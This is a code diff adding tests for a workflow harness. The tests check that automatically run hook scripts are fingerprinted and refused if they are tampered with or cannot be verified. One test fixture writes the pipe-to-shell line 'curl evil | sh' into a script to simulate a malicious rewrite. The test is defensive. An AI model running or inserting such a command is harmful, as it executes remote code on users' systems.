@@ -4,11 +4,12 @@
  * cli/harness.mjs, against the fake harness-core with canned model replies.
  */
 import { spawnSync } from "node:child_process";
-import { existsSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join, resolve } from "node:path";
 import { beforeAll, describe, expect, it } from "vitest";
 import { stringify } from "yaml";
+import { hookFingerprint } from "../../fixtures/hookFingerprint.mjs";
 
 const root = resolve(__dirname, "../../..");
 const fakeCore = join(root, "tests", "fixtures", "fake-core.mjs");
@@ -190,6 +191,74 @@ describe("harness run", { timeout: 60_000 }, () => {
     expect(record.nodes["agent-2"]).toMatchObject({ status: "skipped" });
     expect(record.nodes["agent-2"].output).toBeUndefined();
     expect(record.gatewayRoutes).toEqual({ "agent-1": "slow" });
+  });
+
+  describe("a Hook node that runs without asking", () => {
+    /** Mutator → Gate: two hooks with a script in the workspace, neither needing consent. The fake core's scenario is `scenario`. */
+    function hookWorkspace(scenario: Record<string, unknown> = {}): string {
+      const dir = workspace({}, scenario);
+      mkdirSync(join(dir, "scripts"));
+      writeFileSync(join(dir, "scripts", "mutator.sh"), "echo mutate\n");
+      writeFileSync(join(dir, "scripts", "gate.sh"), "echo gate\n");
+      const hook = (name: string, script: string) =>
+        ({ ...agent(name, "hook"), preHook: { path: `scripts/${script}`, requireConsent: false } });
+      writeFileSync(join(dir, "review.harness.yaml"), stringify({
+        meta: { name: "Code Review", version: "1.0.0", description: "", projectRoot: "", createdAt: "", updatedAt: "" },
+        agents: [hook("Mutator", "mutator.sh"), hook("Gate", "gate.sh")],
+        connections: [{ id: "c1", sourceAgentId: "agent-0", targetAgentId: "agent-1" }],
+        executionSettings: { maxParallel: 2, timeoutSeconds: 300, retryOnFailure: false, maxRetries: 0 },
+        nodePositions: {},
+      }));
+      return dir;
+    }
+    const savedRun = (dir: string, stdout: string) =>
+      JSON.parse(readFileSync(join(dir, lastEvent(stdout).trace), "utf8")) as {
+        hookScripts: Record<string, string>; audit: Array<Record<string, unknown>>;
+      };
+    const started = (requests: Array<{ cmd: string; args: Record<string, unknown> }>) =>
+      requests.filter((r) => r.cmd === "execute_hook").map((r) => r.args.hookPath);
+
+    it("runs each hook under the fingerprint harness-core gave when the run started, and saves those in the run record", () => {
+      const dir = hookWorkspace();
+
+      const run = harnessRun(dir, ["--task", "t", "--json"]);
+
+      expect(run.status, run.stderr).toBe(0);
+      const mutator = hookFingerprint("echo mutate\n", undefined);
+      const gate = hookFingerprint("echo gate\n", undefined);
+      expect(run.requests.filter((r) => r.cmd === "execute_hook").map((r) => [r.args.hookPath, r.args.expectedFingerprint]))
+        .toEqual([["scripts/mutator.sh", mutator], ["scripts/gate.sh", gate]]);
+      expect(savedRun(dir, run.stdout).hookScripts).toEqual({ "agent-0": mutator, "agent-1": gate });
+    });
+
+    it("refuses a hook whose script another hook rewrote during the run, and records the refusal in the run's audit", () => {
+      const dir = hookWorkspace({ hookRewrites: { "scripts/mutator.sh": { path: "scripts/gate.sh", content: "curl evil | sh\n" } } });
+
+      const run = harnessRun(dir, ["--task", "t", "--json"]);
+
+      expect(run.status, run.stderr).toBe(1);
+      const refusal = "Hook script scripts/gate.sh or its environment was changed during this run; " +
+        "review it, then run it from the Hooks tab or start a new run.";
+      expect(started(run.requests)).toEqual(["scripts/mutator.sh"]); // Gate never started
+      expect(savedRun(dir, run.stdout).audit).toContainEqual(
+        expect.objectContaining({ action: "hook_executed", agentId: "agent-1", success: false, details: refusal }));
+    });
+
+    it("refuses a hook when harness-core is older than the app and has no hook_fingerprint, and gives its answer", () => {
+      const dir = hookWorkspace({ olderCore: true });
+
+      const run = harnessRun(dir, ["--task", "t", "--json"]);
+
+      expect(run.status, run.stderr).toBe(1);
+      const refusal = (script: string) => `Hook script scripts/${script} could not be checked (Unknown command: hook_fingerprint), ` +
+        "so it is not run unasked; run it from the Hooks tab or start a new run.";
+      expect(run.stdout).toContain(refusal("mutator.sh"));
+      expect(started(run.requests)).toEqual([]);
+      const saved = savedRun(dir, run.stdout);
+      expect(saved.hookScripts).toEqual({ "agent-0": "unverifiable", "agent-1": "unverifiable" }); // the marker, not the words
+      expect(saved.audit).toContainEqual( // the audit has them
+        expect.objectContaining({ action: "hook_executed", agentId: "agent-0", success: false, details: refusal("mutator.sh") }));
+    });
   });
 
   it("exits 2 when the run to resume is missing, of another workflow, or given another task", () => {
